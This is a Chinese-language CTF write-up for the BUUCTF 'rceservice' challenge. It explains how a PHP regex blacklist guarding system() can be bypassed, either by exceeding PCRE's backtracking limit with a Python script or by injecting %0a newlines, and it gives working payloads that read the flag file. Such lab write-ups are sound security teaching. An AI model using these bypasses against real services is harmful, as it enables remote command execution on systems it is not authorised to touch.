# 题目分析

上来要输入JSON格式的命令，尝试一下键名为cmd

![image-20250909155616888](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250909155616888.png)

`{{"cmd":"ls"}}`

可以正常执行,列出文件只有index.php

多次尝试，发现`.*|/;?`符号都被过滤,空格倒是在。`pwd`也被过滤了，这道题过滤的东西挺多的。网上查阅发现别的平台有源码附件的，BUUCTF没给，我们审计一下源码：

# 源码

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}
?>
```

这题的核心是绕过正则。

正则表达式的结构是`^.*(黑名单).*$`

^匹配开头，$匹配结尾，`.*`贪婪匹配

- 对于`^....$`形式的正则，可以用%0a绕过法。
- 对于有贪婪匹配的，可以利用超回溯次数的方法。

# 绕过

## 超回溯次数

超回溯次数顾名思义有一个定好的回溯次数。讲到回溯要先讲讲正则引擎。

什么是正则引擎？就是决定正则匹配的时候如何工作，分为两种：

- ### 回溯引擎（Backtracking Engines）

- ### 非回溯引擎（Non-backtracking Engines）

### 回溯引擎

​	当遇到量词（如 `*`, `+`, `?`, `{m,n}`）或分支选择（`|`）时，引擎会记录多个可能的选择点。如果当前选择的路径最终导致匹配失败，它会**回溯**到上一个选择点，尝试另一条路径，直到找到匹配或所有路径都尝试失败为止。简单来说就是遇到贪婪匹配的量词时候会一直匹配到结尾，再不断回溯。

​	比如`".*"`匹配`"hello" world"`，`.*`会从字符`h`一直匹配到结尾的`"`，这时候正则最后的`"`没字符匹配了，于是开始回溯，这里只需回溯一个字符就ok。但是有可能产生大量回溯，耗尽服务器性能，达到DOS攻击的效果。因此一般会设置一个回溯次数上限，而一旦回溯次数突破这个值就立刻返回Flase，即匹配失败，达到绕过效果。

回溯引擎最常见的实现就是**PCRE(Perl Compatible Regular Expressions)**：Perl、**PHP** (`preg_` 函数)、Python (`re` 模块)、JavaScript、Apache、以及许多其他语言和工具。

**Ruby**、**Java** (`java.util.regex`) 等也使用回溯引擎

### 非回溯引擎

相对的非回溯引擎不会回溯，引擎在扫描字符串时，对于每个字符，它所处的状态是确定的。它从左到右扫描输入文本，每个字符只处理一次，**永不回头**。这是通过状态机实现的，具体原理感兴趣的可以自己查阅。非回溯使得性能不会出现灾难性的下降，匹配时间和输入字符串长度呈线性关系。但是缺点是通常**不支持**许多高级特性，比如捕获组。

常见实现有：

- **大多数Unix工具**： `awk`, `egrep`, `flex`, `lex`。
- **RE2**： 由 Google 开发的高性能正则表达式库，旨在消除灾难性回溯，常用于对安全性和性能要求极高的场景（如 Google Docs）。C++、Go、Ruby 等都有绑定。
- **Rust 的 `regex` crate**： 默认使用基于自动机的引擎，性能极高且安全。



理解原理后，就知道这里可以通过超回溯限制绕过了。php默认最大回溯次数是100万，我们通过在字符串后加上1000000个小写字母

```python
import requests

url = "http://94bd7c78-b08b-4c4a-b7a4-77f3afeec82c.node5.buuoj.cn:81/"
payload = '{"cmd":"ls /","abc":"' + 'a' * 1000000 + '"}'
r = requests.post(url,data={"cmd":payload})
print (r.content.decode())
```

最后的payload最后是`aaaaaaaa...aaa"}`，因为小写字母`a` `"`和`}`都未被过滤，所以在第一个`.*`吃到最后一个字符时，会一直向前回溯，超过100w次从而返回Flase。同时注意GET请求是发不出的，因为url长度限制，后台用$_REQUEST的情况下可以使用POST。

## 利用%0a

原理是没有设置多行模式，即修饰符`m`,那么`^`只会匹配第一行内容。也没有修饰符`s`,`.*`不会匹配换行符%0a

**因为不能匹配到完整的字符串而绕过。**

可用payload如下：

``````
?cmd={%0a"cmd":"/bin/cat /home/rceservice/flag"%0a}
#第一个.*匹配{，然后第一个%0a由黑名单捕获，但是最后的 .* 不能匹配换行符,因此也匹配不到换行后的 }所以不能匹配到完整字符串,返回值为空,完成正则绕过
?cmd=%0a{%0a"cmd":"/bin/cat /home/rceservice/flag"}
?cmd=%0a{"cmd":"/bin/cat /home/rceservice/flag"%0a}
?cmd=%0a{"cmd":"/bin/cat /home/rceservice/flag"}%0a%0a
#这里要两个%0a是因为单行模式$默认你最后的%0a之前的内容才是要传输的内容
``````

注意这里要GET传入，因为要让%0a url解码。

# 结果

源码第一行是`putenv('PATH=/home/rceservice/jail');`

修改了PATH路径，因此我们调用一些命令要用绝对路径，直接find找一下名字带flag的文件。

```
payload = '{"cmd":"/usr/bin/find / -name flag","abc":"' + 'a' * 1000000 + '"}'
```

找到`/home/rceservice/flag`,然后读取即可